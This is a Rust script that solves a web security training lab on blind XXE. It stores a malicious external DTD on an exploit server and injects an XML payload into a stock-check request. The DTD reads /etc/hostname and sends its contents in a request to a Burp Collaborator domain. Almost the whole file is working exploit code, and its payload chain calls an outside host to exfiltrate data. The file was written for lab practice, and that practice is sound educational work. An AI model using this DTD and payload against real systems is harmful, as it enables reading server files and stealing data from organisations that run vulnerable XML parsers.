/***************************************************************************************
*
* Author: Ahmed Elqalawy (@elqal3awii)
*
* Date: 15/10/2023
*
* Lab: Exploiting blind XXE to exfiltrate data using a malicious external DTD
*
* Steps: 1. Store the malicious DTD file in your exploit server
*        2. Inject payload into the XML-based check stock request to exfiltrate
*           the hostname using an external DTD
*        3. Check your burp collaborator for the hostname in the HTTP request
*           query parameter
*        4. Submit the solution
*
****************************************************************************************/
#![allow(unused)]
/***********
* Imports
***********/
use reqwest::{
    blocking::{Client, ClientBuilder, Response},
    header::HeaderMap,
    redirect::Policy,
};
use std::{
    collections::HashMap,
    io::{self, Write},
    time::Duration,
};
use text_colorizer::Colorize;

/******************
* Main Function
*******************/
fn main() {
    // change this to your lab URL
    let url = "https://0a0300c50321ba038102094400e6002e.web-security-academy.net";

    // change this to your exploit server URL
    let exploit_server_url = "https://exploit-0a50008403dbba7b818508d9014f0010.exploit-server.net";

    // change this to your collaborator domain
    let collaborator = "5agvj7sxm6utfb3l2uktjwixtozfn8bx.oastify.com";

    // build the client that will be used for all subsequent requests
    let client = build_client();

    // the header of your exploit sever response
    let exploit_server_head = r###"HTTP/1.1 200 OK\r\n
    Content-Type: text/plain; charset=utf-8"###;

    // the name of the your malicious file
    // you can change this to what you want
    let malicious_file_name = "exploit.dtd";

    // the content of the malicious DTD file
    let malicious_file = format!(
        r###"<!ENTITY % file SYSTEM "file:///etc/hostname">
        <!ENTITY % eval "<!ENTITY &#x25; exfiltrate SYSTEM 'https://{collaborator}/?hostname=%file;'>">
        %eval;
        %exfiltrate;
        "###
    );

    println!(
        "{} {}",
        "âŸª#âŸ« Injection point:".blue(),
        "XML-based check stock request".yellow(),
    );
    print!(
        "{}",
        "â¦—1â¦˜ Storing the malicious DTD file on your exploit server.. ".white()
    );
    io::stdout().flush();

    // store your malicious DTD file on your exploit server
    client
        .post(exploit_server_url)
        .form(&HashMap::from([
            ("formAction", "STORE"),
            ("urlIsHttps", "on"),
            ("responseFile", &format!("/{malicious_file_name}")),
            ("responseHead", exploit_server_head),
            ("responseBody", &malicious_file),
        ]))
        .send()
        .expect(&format!(
            "{}",
            "[!] Failed to store the malicious DTD file on your exploit server".red()
        ));

    println!("{}", "OK".green());
    print!(
        "{}",
        "â¦—2â¦˜ Injecting payload to exfiltrate the hostname using an external DTD.. ".white()
    );
    io::stdout().flush();

    // payload to exfiltrate the hostname using an external DTD
    let payload = format!(
        r###"<?xml version="1.0" encoding="UTF-8"?>
            <!DOCTYPE foo [ <!ENTITY % xxe SYSTEM "{exploit_server_url}/{malicious_file_name}"> %xxe; ]>
            <stockCheck>
                <productId>
                    2
                </productId>
                <storeId>
                    1
                </storeId>
            </stockCheck>"###
    );

    // fetch the page with the injected payload
    client
        .post(format!("{url}/product/stock"))
        .header("Content-Type", "application/xml")
        .body(payload)
        .send()
        .expect(&format!(
            "{}",
            "[!] Failed to fetch the page with the injected payload".red()
        ));

    println!("{}", "OK".green());
    println!(
        "{}",
        "ðŸ—¹ Check your burp collaborator for the hostname in the HTTP request query parameter then sumbit the solution"
            .white()
            .bold()
    );
}

/*******************************************************************
* Function used to build the client
* Return a client that will be used in all subsequent requests
********************************************************************/
fn build_client() -> Client {
    ClientBuilder::new()
        .redirect(Policy::none())
        .connect_timeout(Duration::from_secs(5))
        .build()
        .unwrap()
}
